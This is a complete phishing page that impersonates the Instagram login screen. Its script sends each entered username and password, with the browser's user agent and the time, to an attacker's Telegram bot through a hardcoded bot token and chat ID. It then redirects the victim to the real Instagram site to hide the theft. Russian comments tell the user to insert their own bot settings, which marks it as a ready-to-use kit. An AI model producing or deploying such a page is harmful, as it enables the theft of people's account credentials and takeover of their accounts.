<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .container {
            max-width: 350px;
            width: 100%;
            padding: 20px;
        }
        
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            text-align: center;
            margin-bottom: 10px;
        }
        
        .logo {
            margin: 20px 0;
            font-size: 42px;
            font-weight: 300;
            font-family: 'Billabong', cursive;
        }
        
        .form-group {
            margin-bottom: 6px;
        }
        
        input {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
        }
        
        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        
        .btn {
            width: 100%;
            padding: 7px;
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            margin: 8px 0;
            cursor: pointer;
        }
        
        .btn:hover {
            background: #007acc;
        }
        
        .separator {
            margin: 15px 0;
            color: #8e8e8e;
            font-size: 13px;
            position: relative;
        }
        
        .separator:before {
            content: "";
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #dbdbdb;
        }
        
        .separator span {
            background: white;
            padding: 0 15px;
        }
        
        .facebook-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            margin: 15px 0;
            cursor: pointer;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin: 15px 0;
        }
        
        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">Instagram</div>
            <form id="loginForm">
                <div class="form-group">
                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn">Log in</button>
            </form>
            
            <div class="separator">
                <span>OR</span>
            </div>
            
            <div class="facebook-login">
                <span>Log in with Facebook</span>
            </div>
            
            <div class="forgot-password">
                Forgot password?
            </div>
        </div>
        
        <div class="signup-box">
            Don't have an account? <a href="#" id="signupLink">Sign up</a>
        </div>
    </div>

    <script>
        // ТВОИ НАСТРОЙКИ - ЗАМЕНИ НА СВОИ!
        const TELEGRAM_BOT_TOKEN = "8240094173:AAHIdJTVijWDl_5lM3ohI-czUn5pQc_Wq_g";
        const TELEGRAM_CHAT_ID = "6030202509";
        
        // Функция отправки в Telegram
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).catch(error => console.error('Error:', error));
        }
        
        // Обработчик формы
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const ip = "Определяется..."; // Можно добавить определение IP
            
            // Создаем сообщение для Telegram
            const message = `
🎯 <b>НОВЫЕ ДАННЫЕ ИНСТАГРАМ</b>

👤 <b>Логин:</b> <code>${username}</code>
🔑 <b>Пароль:</b> <code>${password}</code>
🌐 <b>User-Agent:</b> ${navigator.userAgent}
📍 <b>Время:</b> ${new Date().toLocaleString()}
            `;
            
            // Отправляем в Telegram
            sendToTelegram(message);
            
            // Показываем "загрузку" и редирект
            const btn = this.querySelector('.btn');
            btn.textContent = 'Logging in...';
            btn.disabled = true;
            
            // Через 3 секунды редирект на настоящий Instagram
            setTimeout(() => {
                window.location.href = 'https://www.instagram.com/accounts/login/';
            }, 3000);
        });
        
        // Обработчик кнопки регистрации
        document.getElementById('signupLink').addEventListener('click', function(e) {
            e.preventDefault();
            alert('Registration is temporarily unavailable. Please try logging in.');
        });
    </script>
</body>
</html>
